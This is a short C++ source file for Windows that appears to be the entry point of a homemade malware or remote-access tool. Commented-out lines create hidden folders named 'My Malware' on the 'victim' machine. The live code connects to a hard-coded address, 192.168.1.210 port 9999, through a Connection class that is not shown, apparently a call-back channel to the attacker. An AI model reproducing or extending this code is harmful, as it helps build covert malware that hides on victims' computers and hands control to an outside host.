#include <iostream>
#include "Connection.h"
#include <windows.h>


int main() {


    //Creating the files on victim
//    CreateDirectory("C:\\Users\\All Users\\My Malware", NULL);
//    SetFileAttributes("C:\\Users\\All Users\\My Malware", FILE_ATTRIBUTE_HIDDEN);
//    CreateDirectory("C:\\Users\\All Users\\My Malware\\files", NULL);
//    SetFileAttributes("C:\\Users\\All Users\\My Malware\\files", FILE_ATTRIBUTE_HIDDEN);

    string ip = "192.168.1.210";
    int port = 9999;


    Connection *connection = new Connection(ip, port);
    connection->connection();


    return 0;
}
